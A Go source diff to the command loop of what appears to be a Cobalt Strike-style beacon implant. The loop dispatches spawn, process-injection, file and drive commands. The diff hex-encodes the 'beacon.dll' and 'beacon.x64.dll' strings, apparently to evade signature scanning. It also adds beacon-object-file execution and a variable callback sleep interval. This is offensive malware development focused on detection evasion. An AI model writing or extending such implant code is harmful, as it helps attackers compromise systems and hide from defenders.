@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"main/config"
@@ -9,7 +10,6 @@ import (
 	"main/packet"
 	"main/services"
 	"os"
-	"strings"
 	"time"
 )
 
@@ -91,7 +91,8 @@ func main() {
 								result, err = services.CmdExit()
 								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X64:
-								if strings.Contains(strings.ReplaceAll(string(cmdBuf), "\x00", ""), "be"+"ac"+"on.x6"+"4.dll") {
+								bx64, _ := hex.DecodeString("626561636f6e2e7836342e646c6c") //beacon.x64.dll
+								if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx64) {
 									filename, _ := os.Executable()
 									result, err = services.CmdExecute([]byte(filename), Token)
 								} else {
@@ -99,7 +100,8 @@ func main() {
 								}
 								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X86:
-								if strings.Contains(strings.ReplaceAll(string(cmdBuf), "\x00", ""), "bea"+"con.d"+"ll") {
+								bx86, _ := hex.DecodeString("626561636f6e2e646c6c") //beacon.dll
+								if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx86) {
 									filename, _ := os.Executable()
 									result, err = services.CmdExecute([]byte(filename), Token)
 								} else {
@@ -134,8 +136,8 @@ func main() {
 								result, err = services.CmdMkdir(cmdBuf)
 								callbackType = 0
 							case packet.CMD_TYPE_DRIVES:
-								result, err = services.CmdDrives()
-								callbackType = 0
+								result, err = services.CmdDrives(cmdBuf)
+								callbackType = 22
 							case packet.CMD_TYPE_RM:
 								result, err = services.CmdRm(cmdBuf)
 								callbackType = 0
@@ -186,6 +188,9 @@ func main() {
 							case packet.CMD_TYPE_INJECT_X86:
 								result, err = services.CmdInjectX86(cmdBuf)
 								callbackType = 0
+							case packet.CMD_TYPE_BOF:
+								result, err = services.CMDBof(cmdBuf)
+								callbackType = 0
 							default:
 								err = errors.New("This type is not supported now.")
 							}
@@ -213,7 +218,12 @@ func main() {
 			} else {
 				time.Sleep(config.WaitTime)
 			}*/
-			time.Sleep(config.WaitTime)
+			waitTime, err := services.CallbackTime()
+			if err != nil {
+				fmt.Println(err)
+				packet.ErrorProcess(err)
+			}
+			time.Sleep(waitTime)
 
 		}
 	}
